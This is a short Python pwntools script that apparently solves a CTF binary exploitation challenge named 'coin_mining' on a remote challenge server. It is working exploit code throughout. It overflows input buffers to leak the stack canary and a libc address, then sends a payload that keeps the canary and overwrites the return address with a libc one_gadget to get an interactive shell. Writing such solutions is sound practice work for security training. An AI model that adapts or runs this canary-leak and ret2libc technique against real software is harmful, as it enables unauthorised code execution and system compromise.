from pwn import *

#io = process('./coin_mining')
io = remote('coin-mining-14a3c1ce2b3fe2ec.chall.ctf.blackpinker.com', 443, ssl=True)
libc = ELF('./libc.so.6')

io.recvuntil(b' coin? \n')
io.sendline(b'1')

io.recvuntil(b'you: ')
io.sendline(b'i'*132 + b'abcd')

io.recvuntil(b'abcd\n')
canary = u64(io.recvuntil(b'??')[:-2].rjust(8, b'\x00'))
print(hex(canary))

io.recvuntil(b'again: ')
io.sendline(b'i'*147 + b'abcd')
io.recvuntil(b'abcd\n')
libc.address = u64(io.recvuntil(b'??')[:-2].ljust(8, b'\x00')) - (libc.sym['__libc_start_main'] + 231)
print(hex(libc.address))

io.recvuntil(b'again: ')
one = 0x4f322
payload = b'notHMCUS-CTF{a_coin_must_be_here}\n'
payload += b'\0'*(136-len(payload))
payload += p64(canary)
payload += p64(0)
payload += p64(libc.address + one)
io.sendline(payload)

io.interactive()